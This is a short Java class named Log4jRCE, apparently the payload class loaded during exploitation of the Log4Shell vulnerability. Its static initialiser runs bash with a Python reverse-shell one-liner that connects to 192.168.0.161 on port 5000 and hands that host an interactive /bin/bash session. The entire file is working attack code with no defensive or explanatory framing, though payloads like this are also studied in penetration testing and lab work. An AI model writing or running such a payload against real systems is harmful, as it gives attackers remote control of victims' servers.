public class Log4jRCE {

    static {
        try {
            String[] cmd = {
                "bash", "-c", 
                "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.161\",5000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.Popen([\"/bin/bash\",\"-i\"]);' &"
            };            
            java.lang.Runtime.getRuntime().exec(cmd).waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}